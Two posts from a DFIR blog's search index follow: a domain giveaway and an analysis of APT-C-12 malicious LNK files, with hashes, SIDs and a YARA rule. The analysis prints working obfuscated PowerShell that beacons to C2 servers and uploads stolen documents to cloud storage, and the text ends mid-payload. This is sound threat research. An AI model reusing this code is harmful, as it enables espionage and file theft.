{"categories":[],"posts":[{"content":"Forensic Freebie with digitalforensics.io So, I have an old domain that I haven\u0026rsquo;t used: digitalforensics.io. I could keep paying for ownership, and wait and wait for some reason to come up for me to use it.\nOr, I could use it now by giving it away to someone else who wants to start a digital forensics blog!\nSo that\u0026rsquo;s what I\u0026rsquo;m going to do.\nThe Competition The Applicant Are you an aspiring DFIR student who wants to write a blog? Maybe you have some ideas but haven\u0026rsquo;t got around to it? Maybe you have one idea but don\u0026rsquo;t know where to begin?\nBy \u0026lsquo;student\u0026rsquo; I don\u0026rsquo;t mean strictly in university or formal education. I mean someone who is starting out in the industry. Maybe you have your first job, looking for one, or dream of moving into a DFIR role. If you consider yourself to be starting in your career then you fit that description.\nThe Task Send me the outline for your first three DFIR blog posts you would write for your new blog. Just an outline, not war and peace. Anything up to half a page total. Feel free to including your Linkedin, social media, or anything which might give me insight into your background. If you aren\u0026rsquo;t comfortable doing that, then send me a short paragraph on why you fit the description of \u0026lsquo;DFIR student\u0026rsquo;.\nThe Prize Ok, so the prize might not be amazing, but I\u0026rsquo;ll happily transfer ownership of the domain digitalforensics.io to you so you can get your blog up and running, and put those ideas to paper, err\u0026hellip;bits and bytes.\nTerms and Conditions You rely on me to choose the winner, and I rely on all of you to put forward legitimate entries with the best of intentions. By that, I mean that you are actually a student and do intend to write you blog. While I can\u0026rsquo;t force you, or prevent you, from squatting on the domain (like I have), I\u0026rsquo;ll be disappointed it couldn\u0026rsquo;t have gone to someone who might have made use of it.\nThe only real condition is my decision is final.\nGood luck. I\u0026rsquo;ll review received submissions from 18th May 2020 0900 UTC and depending on how many received I\u0026rsquo;ll announce the winner shortly after.\nHit me up if you have any questions at matt@bitofhex.com.\n","id":0,"section":"posts","summary":"Forensic Freebie with digitalforensics.io So, I have an old domain that I haven\u0026rsquo;t used: digitalforensics.io. I could keep paying for ownership, and wait and wait for some reason to come up for me to use it.\nOr, I could use it now by giving it away to someone else who wants to start a digital forensics blog!\nSo that\u0026rsquo;s what I\u0026rsquo;m going to do.\nThe Competition The Applicant Are you an aspiring DFIR student who wants to write a blog?","tags":["competition"],"title":"Forensic Freebie with `digitalforensics.io`","uri":"https://bitofhex.com/2020/04/18/forensic-freebie/","year":"2020"},{"content":"In July 2018, the Chinese-based research group 360 Technical Intelligence Center (TIC) produced a report \u0026ldquo;蓝宝菇（APT-C-12）针对性攻击技术细节揭秘\u0026rdquo; (Sapphire Mushroom (APT-C-12) Technical Details Revealed1). This report analysed a malicious LNK file allegedly used by the APT group \u0026ldquo;Sapphire Mushroom\u0026rdquo; (蓝宝菇 aka Blue Mushroom aka NuclearCrisis). The group, according to 360 TIC:\n \u0026hellip;has carried out continuous cyber espionage activities on key units and departments of the Chinese government, military industry, scientific research, and finance. The organization focuses on information related to the nuclear industry and scientific research. The targets were mainly concentrated in mainland China\u0026hellip;[M]ore than 670 malware samples have been collected from the group, including more than 60 malicious plugins specifically for lateral movement; more than 40 C2 domain names and IPs related to the organization have also been discovered.\n The group appeared in March 2011 and appears to be targeting a wide variety of Chinese government and industries with spear-phishing emails. An early tactic used right-to-left override (RTLO or RLO) character to give the appearance of a regular file, and also malicious LNK files.\nThere is limited background I can find publicly on this group. They are not listed by that name or any variant on the APT Groups and Operations Spreadsheet. I also don\u0026rsquo;t have access to much private threat intelligence to trawl against. 360 TIC does not make a country attribution (that I can find) in its reports.\nWhat is publicly written is singled-sourced from 360 TIC and helpfully translated by @Viking_Sec\nIt\u0026rsquo;s the \u0026lsquo;L\u0026rsquo; to the \u0026lsquo;N\u0026rsquo; to the \u0026lsquo;K\u0026rsquo; Flash-forward to January 2020 and I was trawling through Hybrid-Analysis searching for interesting LNK files, I came across these five samples:\n Analysis indicates one of these samples is very similar to the same analysed in the 360 TIC report (of which the hash was not released) and the other four were previously unreported. Further, looking at the samples it is possible targets can be identified based on the malware - although this is not confirmed at this time.\nSo, with a combination of thread-pulling and reviewing the original 360 TIC report we can look at how these samples are related and any further information that might be interesting.\nThe Famous Five (LNKs) What immediately stood out to me was the enormous size of these LNK files: between 400KB to 1.3 MB. Which is massive for such a (normally) little file. This generally indicates data is appended to the end of the file. If it\u0026rsquo;s larger than normal then it\u0026rsquo;s often a PE executable that is simply extracted out. How wrong I was.\nWhat was also interesting is all of these samples were Chinese-language named and uploaded to Hybrid-Analysis at about the same time. The summary is as follows:\n.tg {border-collapse:collapse;border-spacing:0;} .tg td{font-family:Arial, sans-serif;font-size:14px;padding:10px 5px;border-style:solid;border-width:1px;overflow:hidden;word-break:normal;border-color:black;} .tg th{font-family:Arial, sans-serif;font-size:14px;font-weight:normal;padding:10px 5px;border-style:solid;border-width:1px;overflow:hidden;word-break:normal;border-color:black;} .tg .tg-1wig{font-weight:bold;text-align:left;vertical-align:top} .tg .tg-0lax{text-align:left;vertical-align:top}   Date of Upload File Name Google Translation SHA256 Hash   October 29th 2019 11:00:46 (UTC) 陈婧简历+作品.lnk Chen Jing's resume + works 20ad6fa72982a6ba0f9499361b2aa3a3f5cca73fd397c2969d08a4c5f2866814   October 29th 2019 11:03:47 (UTC) 周文重：2018博鳌亚洲论坛感谢函.lnk Zhou Wenzhong: Thank you letter for Boao Forum for Asia 2018 b0d7118d75c0f2a99fa5b319148b89148800e5db06ee403d6a31c451a8a54f2b   October 29th 2019 12:40:00 (UTC) 【2018前海合作论坛】.lnk Qianhai Cooperation Forum 2018 70b6961af57bce72b89103197c8897a4ae3ce5fdb835ccd050f24acbac52900d   October 29th 2019 12:40:33 (UTC) 《政法网络舆情》会员申请.lnk  \"Politics and Law Network Public Opinion\" Member Application ea6e7c9b9110c7c21062908be51dd3f881490b40b9b77a534fdc7812ab5cd2af   October 29th 2019 12:40:54 (UTC) 《观察者网》采访提纲暨相关新闻附件.lnk \"Observer Network\" Interview Outline and Related News Attachments 6ccad83fb9f7a50ac95e3e865a27be0288279e76fcd3b5af495c6fcf6d58fa36   The second-last sample (SHA256 ea6e7c9b9110c7c21062908be51dd3f881490b40b9b77a534fdc7812ab5cd2af) is very similar to that analysed in the 360 TIC report. This is based on basic characteristics including: filename, file size, reported strings, reported C2 and exfiltration domains, and secondary dropped malware.\nA Quick Comparison Running the five samples through Eric Zimmerman\u0026rsquo;s LECMD and comparing their overall hex content indicated they were likely related. Points of interest included:\n All had much of their metadata wiped including internal dates and times, MAC addresses, and Volume Serial Numbers. This itself is an anomaly that is a useful tool mark to match samples. What wasn\u0026rsquo;t wiped was the Security Identifier (SID) for each of the LNK files which indicated the user account from which the LNK file was created:  .tg {border-collapse:collapse;border-spacing:0;} .tg td{font-family:Arial, sans-serif;font-size:14px;padding:10px 5px;border-style:solid;border-width:1px;overflow:hidden;word-break:normal;border-color:black;} .tg th{font-family:Arial, sans-serif;font-size:14px;font-weight:normal;padding:10px 5px;border-style:solid;border-width:1px;overflow:hidden;word-break:normal;border-color:black;} .tg .tg-cly1{text-align:left;vertical-align:middle} .tg .tg-yla0{font-weight:bold;text-align:left;vertical-align:middle} .tg .tg-0lax{text-align:left;vertical-align:top}   SHA256 Hash SID   20ad6fa72982a6ba0f9499361b2aa3a3f5cca73fd397c2969d08a4c5f2866814 S-1-5-21-768223713-132671932-3453716105-7998   b0d7118d75c0f2a99fa5b319148b89148800e5db06ee403d6a31c451a8a54f2b S-1-5-21-768223713-132671932-3453716105-8001   70b6961af57bce72b89103197c8897a4ae3ce5fdb835ccd050f24acbac52900d S-1-5-21-768223713-132671932-3453716105-7998   ea6e7c9b9110c7c21062908be51dd3f881490b40b9b77a534fdc7812ab5cd2af S-1-5-21-768223713-132671932-3453716105-7998   6ccad83fb9f7a50ac95e3e865a27be0288279e76fcd3b5af495c6fcf6d58fa36 S-1-5-21-768223713-132671932-3453716105-7998   So, all the samples were created on the same Windows environment and all but one was created with the same user account. Maybe they let the intern have a go?\nThis would be a good Yara rule to start a hunt:\nrule LNK_Based_on_SID { meta: sample = \"70b6961af57bce72b89103197c8897a4ae3ce5fdb835ccd050f24acbac52900d\" author = \"@mattnotmax\" date = \"2020-01-23\" strings: $SID = \"S-1-5-21-768223713-132671932-3453716105\" wide condition: filesize  400KB and uint16(0) == 0x4c and $SID }  Only one sample (70b6961af57bce72b89103197c8897a4ae3ce5fdb835ccd050f24acbac52900d) had been uploaded to Virus Total about the same time as the Hybrid-Analysis uploads: 29 October 2019 at 12:43:22 UTC. At the time of writing it registered 16/58 detections, but all were non-specific Trojan detections.\n Malicious Script Delivery All the LNK files also have similar PowerShell delivery: a plethora of white space to hide a PowerShell encoded commanded from the user, followed by a Base64 encoded script.\n The five payloads are:\n-w hidden $r='LWpvaW4oKDM2LDU3LDYxLDM2LDEwNCwxMTEsMTE1LDExNiw0NiwxMTcsMTA1LDQ2LDExNCw5NywxMTksMTE3LDEwNSw0NiwxMTksMTA1LDExMCwxMDAsMTExLDExOSwxMTYsMTA1LDExNiwxMDgsMTAxLDU5LDczLDEwMiw0MCwzMywzNiw1Nyw0NiwxMDEsMTEwLDEwMCwxMTUsMTE5LDEwNSwxMTYsMTA0LDQwLDM5LDQ2LDEwOCwxMTAsMTA3LDM5LDQxLDQxLDEyMywzNiw1Nyw0Myw2MSwzOSw0NiwxMDgsMTEwLDEwNywzOSwxMjUsMzYsNTcsNjEsMTAzLDEwNSwzMiwzNiw1Nyw1OSwxMDgsMTA5LDU2LDMyLDQwLDEwMyw5OSwzMiwzNiw1NywxMjQsMTE1LDEwMSwxMDgsMTAxLDk5LDExNiwzMiw0NSwxMDgsMzIsNDksNDEpfCV7W2ludF0kXy1BU1tjaGFyXX0pfGlleA==';Function lm8{param($v);iex ([text.encoding]::utf8.getstring([convert]::frombase64string($v)))}lm8 $r -w hidden $6='LWpvaW4oKDM2LDQ5LDYxLDM2LDEwNCwxMTEsMTE1LDExNiw0NiwxMTcsMTA1LDQ2LDExNCw5NywxMTksMTE3LDEwNSw0NiwxMTksMTA1LDExMCwxMDAsMTExLDExOSwxMTYsMTA1LDExNiwxMDgsMTAxLDU5LDczLDEwMiw0MCwzMywzNiw0OSw0NiwxMDEsMTEwLDEwMCwxMTUsMTE5LDEwNSwxMTYsMTA0LDQwLDM5LDQ2LDEwOCwxMTAsMTA3LDM5LDQxLDQxLDEyMywzNiw0OSw0Myw2MSwzOSw0NiwxMDgsMTEwLDEwNywzOSwxMjUsMzYsNDksNjEsMTAzLDEwNSwzMiwzNiw0OSw1OSwxMTksMTE0LDQ5LDMyLDQwLDEwMyw5OSwzMiwzNiw0OSwxMjQsMTE1LDEwMSwxMDgsMTAxLDk5LDExNiwzMiw0NSwxMDgsMzIsNDksNDEpfCV7W2ludF0kXy1BU1tjaGFyXX0pfGlleA==';Function wr1{param($3);iex ([text.encoding]::utf8.getstring([convert]::frombase64string($3)))}wr1 $6 -w hidden $3='LWpvaW4oKDM2LDUwLDYxLDM2LDEwNCwxMTEsMTE1LDExNiw0NiwxMTcsMTA1LDQ2LDExNCw5NywxMTksMTE3LDEwNSw0NiwxMTksMTA1LDExMCwxMDAsMTExLDExOSwxMTYsMTA1LDExNiwxMDgsMTAxLDU5LDczLDEwMiw0MCwzMywzNiw1MCw0NiwxMDEsMTEwLDEwMCwxMTUsMTE5LDEwNSwxMTYsMTA0LDQwLDM5LDQ2LDEwOCwxMTAsMTA3LDM5LDQxLDQxLDEyMywzNiw1MCw0Myw2MSwzOSw0NiwxMDgsMTEwLDEwNywzOSwxMjUsMzYsNTAsNjEsMTAzLDEwNSwzMiwzNiw1MCw1OSwxMTAsNDgsNDgsMzIsNDAsMTAzLDk5LDMyLDM2LDUwLDEyNCwxMTUsMTAxLDEwOCwxMDEsOTksMTE2LDMyLDQ1LDEwOCwzMiw0OSw0MSl8JXtbaW50XSRfLUFTW2NoYXJdfSl8aWV4';Function n00{param($z);iex ([text.encoding]::utf8.getstring([convert]::frombase64string($z)))}n00 $3 -w hidden $5='LWpvaW4oKDM2LDEwMSw2MSwzNiwxMDQsMTExLDExNSwxMTYsNDYsMTE3LDEwNSw0NiwxMTQsOTcsMTE5LDExNywxMDUsNDYsMTE5LDEwNSwxMTAsMTAwLDExMSwxMTksMTE2LDEwNSwxMTYsMTA4LDEwMSw1OSw3MywxMDIsNDAsMzMsMzYsMTAxLDQ2LDEwMSwxMTAsMTAwLDExNSwxMTksMTA1LDExNiwxMDQsNDAsMzksNDYsMTA4LDExMCwxMDcsMzksNDEsNDEsMTIzLDM2LDEwMSw0Myw2MSwzOSw0NiwxMDgsMTEwLDEwNywzOSwxMjUsMzYsMTAxLDYxLDEwMywxMDUsMzIsMzYsMTAxLDU5LDExNSwxMDYsNTUsMzIsNDAsMTAzLDk5LDMyLDM2LDEwMSwxMjQsMTE1LDEwMSwxMDgsMTAxLDk5LDExNiwzMiw0NSwxMDgsMzIsNDksNDEpfCV7W2ludF0kXy1BU1tjaGFyXX0pfGlleA==';Function sj7{param($z);iex ([text.encoding]::utf8.getstring([convert]::frombase64string($z)))}sj7 $5 -w hidden $o='LWpvaW4oKDM2LDk3LDYxLDM2LDEwNCwxMTEsMTE1LDExNiw0NiwxMTcsMTA1LDQ2LDExNCw5NywxMTksMTE3LDEwNSw0NiwxMTksMTA1LDExMCwxMDAsMTExLDExOSwxMTYsMTA1LDExNiwxMDgsMTAxLDU5LDczLDEwMiw0MCwzMywzNiw5Nyw0NiwxMDEsMTEwLDEwMCwxMTUsMTE5LDEwNSwxMTYsMTA0LDQwLDM5LDQ2LDEwOCwxMTAsMTA3LDM5LDQxLDQxLDEyMywzNiw5Nyw0Myw2MSwzOSw0NiwxMDgsMTEwLDEwNywzOSwxMjUsMzYsOTcsNjEsMTAzLDEwNSwzMiwzNiw5Nyw1OSwxMTMsNTQsNTIsMzIsNDAsMTAzLDk5LDMyLDM2LDk3LDEyNCwxMTUsMTAxLDEwOCwxMDEsOTksMTE2LDMyLDQ1LDEwOCwzMiw0OSw0MSl8JXtbaW50XSRfLUFTW2NoYXJdfSl8aWV4';Function q64{param($6);iex ([text.encoding]::utf8.getstring([convert]::frombase64string($6)))}q64 $o  When converted from Base64 there is another layer of CharCode (Unicode character numbers):\n-join((36,57,61,36,104,111,115,116,46,117,105,46,114,97,119,117,105,46,119,105,110,100,111,119,116,105,116,108,101,59,73,102,40,33,36,57,46,101,110,100,115,119,105,116,104,40,39,46,108,110,107,39,41,41,123,36,57,43,61,39,46,108,110,107,39,125,36,57,61,103,105,32,36,57,59,108,109,56,32,40,103,99,32,36,57,124,115,101,108,101,99,116,32,45,108,32,49,41)|%{[int]$_-AS[char]})|iex -join((36,49,61,36,104,111,115,116,46,117,105,46,114,97,119,117,105,46,119,105,110,100,111,119,116,105,116,108,101,59,73,102,40,33,36,49,46,101,110,100,115,119,105,116,104,40,39,46,108,110,107,39,41,41,123,36,49,43,61,39,46,108,110,107,39,125,36,49,61,103,105,32,36,49,59,119,114,49,32,40,103,99,32,36,49,124,115,101,108,101,99,116,32,45,108,32,49,41)|%{[int]$_-AS[char]})|iex -join((36,50,61,36,104,111,115,116,46,117,105,46,114,97,119,117,105,46,119,105,110,100,111,119,116,105,116,108,101,59,73,102,40,33,36,50,46,101,110,100,115,119,105,116,104,40,39,46,108,110,107,39,41,41,123,36,50,43,61,39,46,108,110,107,39,125,36,50,61,103,105,32,36,50,59,110,48,48,32,40,103,99,32,36,50,124,115,101,108,101,99,116,32,45,108,32,49,41)|%{[int]$_-AS[char]})|iex -join((36,101,61,36,104,111,115,116,46,117,105,46,114,97,119,117,105,46,119,105,110,100,111,119,116,105,116,108,101,59,73,102,40,33,36,101,46,101,110,100,115,119,105,116,104,40,39,46,108,110,107,39,41,41,123,36,101,43,61,39,46,108,110,107,39,125,36,101,61,103,105,32,36,101,59,115,106,55,32,40,103,99,32,36,101,124,115,101,108,101,99,116,32,45,108,32,49,41)|%{[int]$_-AS[char]})|iex -join((36,97,61,36,104,111,115,116,46,117,105,46,114,97,119,117,105,46,119,105,110,100,111,119,116,105,116,108,101,59,73,102,40,33,36,97,46,101,110,100,115,119,105,116,104,40,39,46,108,110,107,39,41,41,123,36,97,43,61,39,46,108,110,107,39,125,36,97,61,103,105,32,36,97,59,113,54,52,32,40,103,99,32,36,97,124,115,101,108,101,99,116,32,45,108,32,49,41)|%{[int]$_-AS[char]})|iex  The above two rounds of obfuscation can be decoded using CyberChef goodness:\n[{\"op\":\"Regular expression\",\"args\":[\"User defined\",\"[a-zA-Z0-9+=/]{30,}\",true,true,false,false,false,false,\"List matches\"]},{\"op\":\"Fork\",\"args\":[\"\\\\n\",\"\\\\n\\\\n\\\\n\",false]},{\"op\":\"From Base64\",\"args\":[\"A-Za-z0-9+/=\",true]},{\"op\":\"Regular expression\",\"args\":[\"User defined\",\"([0-9]{2,3})\",true,true,false,false,false,false,\"List matches\"]},{\"op\":\"Find / Replace\",\"args\":[{\"option\":\"Extended (\\\\n, \\\\t, \\\\x...)\",\"string\":\"\\\\n\"},\", \",true,false,true,false]},{\"op\":\"From Charcode\",\"args\":[\"Comma\",10]}] This reveals:\n$9=$host.ui.rawui.windowtitle;If(!$9.endswith('.lnk')){$9+='.lnk'}$9=gi $9;lm8 (gc $9|select -l 1) $1=$host.ui.rawui.windowtitle;If(!$1.endswith('.lnk')){$1+='.lnk'}$1=gi $1;wr1 (gc $1|select -l 1) $2=$host.ui.rawui.windowtitle;If(!$2.endswith('.lnk')){$2+='.lnk'}$2=gi $2;n00 (gc $2|select -l 1) $e=$host.ui.rawui.windowtitle;If(!$e.endswith('.lnk')){$e+='.lnk'}$e=gi $e;sj7 (gc $e|select -l 1) $a=$host.ui.rawui.windowtitle;If(!$a.endswith('.lnk')){$a+='.lnk'}$a=gi $a;q64 (gc $a|select -l 1)  All of these do the same thing: check the title text in the current window, rename that text to end in .lnk if needed, then select the last line of the LNK file and extract it.\nBabushka (LNK) Dolls Extracting out the last line of the LNK files reveals more Base64 encoded CharCode. Due to the length, I\u0026rsquo;ll copy one sample here and the same CyberChef recipe can quickly deal with it:\nHere\u0026rsquo;s the extracted and semi-clean PowerShell from sample 70b6961af57bce72b89103197c8897a4ae3ce5fdb835ccd050f24acbac52900d:\n[io.file]::writeallbytes(\"$env:tmp\\xgihT.Z\",[convert]::frombase64string((gc $2|select -l 2|select -f 1))); expand /f:* \"$env:tmp\\xgihT.Z\" \"$env:tmp\\\"; del -fo \"$env:tmp\\xgihT.Z\"; If (test-path $env:tmp\\xgihT) { del -fo -r \"$env:tmp\\xgihT\" } rni -fo \"$env:tmp\\tmp\" \"xgihT\"; md -fo \"$env:AppData\\WinRAR\"; mv -fo \"$env:tmp\\xgihT\\Rar.exe\" \"$env:AppData\\WinRAR\\\"; mv -fo \"$env:tmp\\xgihT\\FLrzH.w\" \"$env:tmp\\..\\\"; If ($2.fullname.startswith($env:tmp)) { del -fo -r (\"$env:tmp\\\"+$2.basename); rni -fo \"$env:tmp\\xgihT\" $2.basename; ii (\"$env:tmp\\\"+$2.basename+\"\\\") } Else { del -fo $2; md -fo $2.basename; mv -fo \"$env:tmp\\xgihT\\*\" $2.basename; del -fo -r \"$env:tmp\\xgihT\"; ii \"$($2.basename)\\\" } If (test-path $env:tmp\\backups) { If (((get-date)-(get-item $env:tmp\\backups).LastAccessTime).totalminutes -le 60) { exit } del -fo -r \"$env:tmp\\backups\" } If (test-path \"$env:tmp\\..\\FLrzH.w\") { rundll32 \"$env:tmp\\..\\FLrzH.w\",DllRegister ` \"powershell -w hidden ` \"\"Function we8([String]`$3,`$7='MD5'){`$g=New-Object System.Text.StringBuilder;` `$9=[System.Security.Cryptography.HashAlgorithm]::Create(`$7).ComputeHash([System.Text.Encoding]::UTF8.GetBytes(`$3));` foreach(`$1 in `$9) {` [Void]`$g.Append(`$1.ToString('x2'))` }` `$w=`$g.ToString();` `$e=`$w.substring(0,12);` return `$e}` Function qv1 (`$3) {` `$w=[System.Text.Encoding]::UTF8;` `$x=`$w.GetBytes('s');` `$s=`$(for(`$e=0;` `$e -lt `$3.length;) {` for(`$g=0;`$g -lt `$x.length;`$g++) {` `$3[`$e] -bxor `$x[`$g];` `$e++;If(`$e -ge `$3.Length) {` `$g=`$x.length` }` }` }`);` `$7=`$w.GetString(`$s);` return `$7` }` Function qc4 {` `$s=0;` `$q=`$m.length;` while (1) {` `$w=@();` `$7=Get-WmiObject win32_networkadapterconfiguration;` foreach(`$zv7 in `$7) {` If(`$zv7.macaddress) {` `$w+=`$zv7.macaddress` }` }` `$zv7=@();` foreach(`$ij4 in `$w) {` If(`$ij4.contains(':')) {` `$zv7+=`$ij4.substring(0,17) -replace ':',''` }` }` `$zv7=`$zv7|sort;` `$zy3=we8 (`$zv7[-1]+`$env:username);` `$xi2=new-object System.Net.WebClient;` `$xi2.headers.add('user-agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like DA) Chrome/62.0.3202.94 Safari/.36');` `$xi2.headers.add('Cookie','PHPSESSID='+`$zy3+'; csrftoken=u32t4o3tb3lbj'+`$v+'; _gat='+`$u+';');` try {` `$0=`$xi2.DownloadString(`$m[`$s]);`$ri8=`$0.split(' ');` `$jd4= `$ri8.Length;` `$qw2=new-object int[] `$jd4;` for(`$e=0;`$e -lt `$jd4;`$e+=1) {` `$qw2[`$e]=[int]`$ri8[`$e]` }` `$0=qv1 `$qw2;iex `$0;` while(1) {` try {` ROAGC `$8 `$u `$m `$a `$zy3` }` catch {}` }` }` catch {` If(`$s -lt (`$q-1)) {` `$s+=1` }` Else {` `$s=0` }` }` Start-Sleep -s 180` }` }` `$v='';` `$0=[System.Text.Encoding]::Default.EncodingName;` If(`$0.endswith('jis)')) {` `$v='5'` }` Elseif(`$0.endswith('f-16)')) {` `$v='4'` }` Elseif(`$0.endswith('M437)')) {` `$v='3'` }` Elseif(`$0.endswith('g5)')) {` `$v='1'` }` Elseif(`$0.endswith('12)')) {` `$v='0'` }` Else {`$v='2'}` `$0='http://159.65.74.97;http://159.65.127.93;http://128.199.73.43';` `$m=`$0.split(';');` `$a='o19JOAiPTbSozNpAcIRYRy20E/sAYzrJxFzmsAQTbBo=';` `$u='REDACTED';` `$8=10;` `$0=-join(get-random ([char[]](65..90+97..122)) -c 7 -s `$([int](get-date -f yyyMd)));` `$nl7=new-object system.threading.mutex(0,`$0);` If (`$nl7.waitone(1)) {` try {` qc4` }` finally {` `$nl7.releasemutex()` }` }` \"\"\" } md -fo \"$env:tmp\\backups\"; Function u65($9) { [system.gc]::collect(); $6=[System.Net.WebRequest]::Create($9.Uri1); $6.proxy=$Null; $6.keepalive=$False; $6.Method=$9.Method1; If ($9.Header2.count) { foreach($1 in $9.Header2.getenumerator()) { If ($1.name) { $6.Headers.Add($1.name, $1.value) } } } $6.AllowAutoRedirect=$False; $6.ContentLength=$9.Body.Length; $x=$6.GetRequestStream(); $x.Write($9.Body,0,$9.Body.Length); $t=$6.GetResponse(); If ($9.GData) { $r=$t.GetResponseStream(); $e=New-Object System.IO.StreamReader $r; $n=$e.ReadToEnd() } If ($t -ne $Null) { $t.close() } If ($6 -ne $Null) { $6.abort() } If ($9.GData) { return ($t.statuscode,([xml]$n).InitiateMultipartUploadResult.UploadId) } return $t } Function v95($2,$p) { $e=New-Object System.Security.Cryptography.HMACSHA256; $e.key=$2;$2=$e.ComputeHash([Text.Encoding]::utf8.GetBytes($p)); return $2 } Function y79($p) { $9=[Security.Cryptography.HashAlgorithm]::Create(\"SHA256\"); $4=[Text.Encoding]::utf8.GetBytes($p); $h=$9.ComputeHash($4); return -join($h| % {\"{0:x2}\" -f $_}) } Function ww2($9) { $c='/'; If ($9.DIRNAME) { $c+=\"$($9.DIRNAME)/\" } If ($9.FILENAME) { $c+=$9.FILENAME}$5=''; ($9.CANON_HEAD.keys | sort) | % {$5+=\"$($_):$($9.CANON_HEAD[$_])`n\"}; $0=\"$($9.METHOD)`n$c`n$($9.QUERYS)`n$5`n$($9.SIGNHEAD)`n$($9.BODY_SIG)\"; return \"AWS4-HMAC-SHA256`n$($9.ISODATE)`n$($9.DATE)/$($9.REGION)/s3/aws4_request`n$(y79 $0)\" } Function i09($9) { $c=[convert]::frombase64string('+ji52ydI8GAan3Xej2sIhMfPEEATEQjehjYt2Nh+ZqQ='); $7=v95 $c $9.REGION;$i=v95 $7 \"s3\"; $s=v95 $i \"aws4_request\"; $2=v95 $s $9.CANON_REQ;return -join($2|%{\"{0:x2}\" -f $_}) } Function en2($9,$6,$7) { $9.ISODATE='20180621T015829Z'; $9.DATE=$9.ISODATE.split('T')[0];$9.CANON_HEAD=@{\"host\"=$9.HOSTURL;\"x-amz-content-sha256\"=$9.BODY_SIG;\"x-amz-date\"=$9.ISODATE}; If ($9.FileMD5) { $9.CANON_HEAD.add('content-md5',$9.FileMD5) } $9.SIGNHEAD=($9.CANON_HEAD.keys|sort) -join ';'; $9.CANON_REQ=ww2 $9;$9.CANON_SIG=i09 $9; $t=@{\"x-amz-content-sha256\"=$9.BODY_SIG;\"x-amz-date\"=$9.ISODATE;\"Authorization\"=\"AWS4-HMAC-SHA256 Credential=$($9.ACCESS_KEY)/$($9.DATE)/$($9.REGION)/s3/aws4_request, SignedHeaders=$($9.SIGNHEAD), Signature=$($9.CANON_SIG)\"};If($9.FileMD5){$t.add('content-md5',$9.FileMD5)}$x=\"https://$($9.HOSTURL)/\"; If ($9.DIRNAME) { $x+=\"$($9.DIRNAME)/\" } If ($9.FILENAME) { $x+=$9.FILENAME } If ($9.QUERYS) { $x+=\"?$($9.QUERYS)\" } $b=@{Uri1=$x;Body=$6;Method1=$9.METHOD;Header2=$t;GData=$7}; return $b } Function ts3($l,$x,$t) { $9=@{METHOD='POST';HOSTURL='05012.ams3.digitaloceanspaces.com';ACCESS_KEY='BVTTZPQUDF3W4Z7P3WTN';REGION='nyc3';DIRNAME=$x;FILENAME=$t.tostring()+$l.extension}; $3=$False; $g=$False; try { $f=New-Object System.IO.FileStream $l.fullname, 'Open'; If ($f.Length -gt 5Mb) { $g=$True; $i=New-Object System.Xml.XmlDocument; $4=$i.Createelement('CompleteMultipartUpload'); $9.QUERYS='uploads='; $9.BODY_SIG=y79 ''; $b=en2 $9 '' $True; $0=u65 $b; $n=[int]$0[0]; $x=$0[1] } } catch {} If ($n -eq 200 -or -not $g) { $t=0; $o=0; $h=1; $2=5Mb; try { [byte[]]$6=New-Object byte[] $2; while ($o -le 10) { $o+=1; $w=[Math]::Min($2,$f.Length-$t); If ($w -lt $2) { [byte[]]$6=New-Object byte[] $w } $q=$f.Read($6,0,$w); If ($q -ne $w) { break } $q=New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider; $9.METHOD='PUT'; $9.BODY_SIG='UNSIGNED-PAYLOAD'; $9.FileMD5=[convert]::tobase64string($q.ComputeHash($6)); If ($g) { $9.QUERYS=\"partNumber=$h\u0026uploadId=$x\" } $b=en2 $9 $6 $False; $0=u65 $b; $n=[int]$0.StatusCode; If ($n -eq 200) { If ($g) { $q=$i.Createelement('Part'); $p=$i.Createelement('PartNumber'); $p.innertext=$h; [void]$q.appendchild($p); $6=$i.Createelement('ETag'); $6.innertext=$0.Headers['etag']; [void]$q.appendchild($6); [void]$4.appendchild($q); $h+=1; $t+=$w } else { $3=$True } If ($t -eq $f.Length) { break } } else { If ($f.Position -ne $t) { [void]$f.Seek($t,[System.IO.SeekOrigin]::Begin) } } } If ($g) { $9.METHOD='POST'; $g=[byte[]][char[]]$4.outerxml; $9.BODY_SIG=y79 $4.outerxml; $9.QUERYS=\"uploadId=$x\"; $9.FileMD5=''; $b=en2 $9 $g $False; $0=u65 $b; If ([int]$0.StatusCode -eq 200) { $3=$True } } } catch { } } $f.Close(); $f.Dispose(); return $3 } Function x56($6,$g,$f) { iex (\"\u0026 '$env:AppData\\WinRAR\\Rar.exe' a -ep1 -y -hp$6 '$g' '$f'\") | out-null; If (!(test-path $g)) { makecab \"$f\" \"$g\" | out-null } } Function zm7($l,$n,$g,$y,$x) { $s=\"[\"+$g+\"] \"+($l.fullName)+\" Size:\"+($l.Length/1kb)+\"KB Time:\"+($l.LastWriteTime); Try { gc $l.fullname -fo -total 0 -erroraction stop; $7=$True; If ($l.extension -eq '.txt' -and $l.Length -gt 10KB) { $7=$False } If ($n -eq $_.Length) { $7=$False } If ($l.Length -le 100MB -and $l.Length -gt 0 -and $7) { $9=\"$env:tmp\\backups\\$g.rar\"; x56 $j $9 $l.fullName; If (test-path $9) { $9=gi -fo $9 } Else { $9=$l } If (ts3 $9 $x $y) { $s+=\" ($y)OK`r`n\"; sleep -s 1 } Else { $s+=\" (Error)`r`n\" } If ($9.extension -eq '.rar') { del -fo $9.fullname } } Else { $s+=\"[!Size or Duplicate!]`r`n\" } } Catch { $s+=\"[!Access denied!!]`r`n\" } return $s } Function sr2($j,$x) { $6=180; $y=1; $b=0; $e=(Get-Date -f yyyyMMddhhmmss)+\"`r`nWeek:`r`n\"; $n=0; $f=('.doc','.docx','.pdf','.ppt','.pptx','.xls','.xlsx','.wps','.wpp','.et','.txt'); gci \"$env:appdata\\Microsoft\\Windows\\Recent\\\" -fo -errora silentlycontinue | ? { $f -contains [io.path]::getextension($_.basename) -and $_.LastWriteTime -ge (Get-Date).AddDays(-7)} | % {gi ((new-object -com wscript.shell).createshortcut($_.fullname)).targetpath -fo -errora silentlycontinue} | % {$b+=1;$e+=zm7 $_ $n $b $y $x;$n=$_.Length; If ($e.endswith(\"OK`r`n\")) { $y+=1 }}; $5=@(); $5+=gdr -p 'fi*' | ? {$_.root -ne \"$env:systemdrive\\\"} | % {gci -fo $_.root}; $5+=gci -fo \"$env:systemdrive\\users\"; $5+=gci -fo \"$env:systemdrive\\\" | ? {$_.fullname -notlike '*:\\Windows*' -and $_.fullname -notlike '*:\\Users' -and $_.fullname -notlike '*:\\Program Files*' -and $_.fullname -notlike 